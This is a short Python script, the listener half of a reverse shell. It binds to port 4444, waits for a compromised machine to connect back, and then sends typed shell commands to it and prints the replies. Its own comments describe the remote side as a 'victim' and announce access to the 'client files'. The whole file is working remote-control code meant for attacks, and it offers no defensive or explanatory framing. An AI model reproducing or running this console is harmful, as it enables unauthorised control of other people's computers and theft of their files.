import socket
import sys
import time

timer_c = 5
# Create a Socket ( To connect two computers)
def create_soc():
    try:
        global host
        global port
        global socket_conn
        host = ""
        port = 4444
        socket_conn = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_soc():
    try:
        global host
        global port
        global socket_conn
        print("**** Searching For Reverse Connection From Client ****")
        print('Once Client Opens any activity, connection will be established, Please Wait')
        
        socket_conn.bind((host, port))
        socket_conn.listen(1)

    except socket.error as msg:
        print("Socket Binding error" + str(msg))
        bind_soc()


# Establish connection with a client

def socket_accept():
    conn, address = socket_conn.accept()
    print('-------------------------------------------------------')
    print("Connection has been established with" + " IP " + address[0] + " Port : " + str(address[1]))
    print('-------------------------------------------------------')
    print('Please Wait {} seconds'.format(timer_c))
    timer()
    print('***** Now You have access to client files, please proceed with commands ****')
    send_commands(conn)
    conn.close()

# Sending commands to client/victim or a friend
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            socket_conn.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")

def timer():
    global timer_c
    a = timer_c
    while (a>0):
        print(a, '\r',end ="")
        time.sleep(1)
        a -=1  

def main():
    create_soc()
    bind_soc()
    socket_accept()

 
            

main()







